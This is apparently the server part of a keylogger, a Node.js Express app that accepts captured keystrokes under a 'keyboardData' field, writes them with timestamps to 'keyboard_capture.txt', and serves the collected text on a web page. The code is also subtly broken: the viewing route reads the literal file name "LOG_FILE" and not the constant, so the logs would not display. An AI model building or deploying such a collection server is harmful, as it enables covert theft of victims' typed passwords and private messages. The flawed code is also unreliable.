const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(express.json({ limit: "1mb" }))

app.use(bodyParser.json({ extended: true }));

const port = 8000;
const LOG_FILE = "keyboard_capture.txt";

// ***** GET request to get the logged data *****
app.get("/", (req, res) => {
    try {
        const data = fs.readFileSync("LOG_FILE", { encoding: 'utf8', flag: 'r' });

        res.send(`
            <h1>Logged data</h1>
            <pre style="white-space:pre-wrap;font-family:monospace">
            ${data
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")}
            </pre>
                `);
    } catch (error) {
        res.send("<h1>Nothing logged yet</h1>");
    }
});

// ***** POST request to log the data *****
app.post("/", (req, res) => {

    if (!req.body || !req.body.keyboardData) {
        return res.sendStatus(400);
    }

    let data = req.body.keyboardData;

    // format cho dễ đọc 
    data = data
        .replace(/Key:\s*\d+/g, "")
        .replace(/\s+/g, " ");

    const line =
        `\n[${new Date().toISOString()}]\n` +
        data + "\n";

    fs.appendFileSync(LOG_FILE, line);

    console.log(line.trim());
    res.send("OKE");
});

app.listen(port, () => {
    console.log(`App is listening on port ${port}`);
});